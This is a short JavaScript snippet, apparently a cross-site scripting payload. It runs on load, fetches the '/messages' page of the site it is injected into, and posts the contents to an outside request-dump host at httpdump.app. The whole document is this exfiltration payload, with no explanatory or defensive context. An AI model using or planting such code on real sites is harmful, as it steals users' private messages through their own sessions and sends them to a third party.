async function send(){ const response = await fetch('/messages'); const messages = await response.text(); await fetch('https://httpdump.app/dumps/example', {method: 'POST', body: JSON.stringify({data: messages})}); }
send();
